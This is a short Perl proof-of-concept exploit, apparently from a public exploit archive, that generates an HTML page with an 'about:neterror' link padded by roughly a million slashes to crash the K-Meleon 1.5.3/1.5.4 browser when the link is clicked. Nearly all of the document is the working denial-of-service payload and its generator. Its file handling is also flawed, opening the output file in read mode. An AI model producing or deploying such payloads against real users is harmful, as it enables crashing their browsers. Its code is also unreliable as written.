#######################################################################
#!/usr/bin/perl
# k-meleon Long "a href" Link DoS
# Author: Lostmon Lords Lostmon@gmail.com http://lostmon.blogspot.com
# k-Meleon versions 1.5.3 & 1.5.4 internal page about:neterror DoS
# generate the file open it with k-keleon click in the link and wait a seconds
######################################################################

$archivo = $ARGV[0];
if(!defined($archivo))
{

print "Usage: $0 <archivo.html>\n";

}

$cabecera = "<html>" . "\n";
$payload = "<a href=\"about:neterror?e=connectionFailure&c=" . "/" x
1028135 . "\">click here if you can :)</a>" . "\n";
$fin = "</html>";

$datos = $cabecera . $payload . $fin;

open(FILE, '<' . $archivo);
print FILE $datos;
close(FILE);

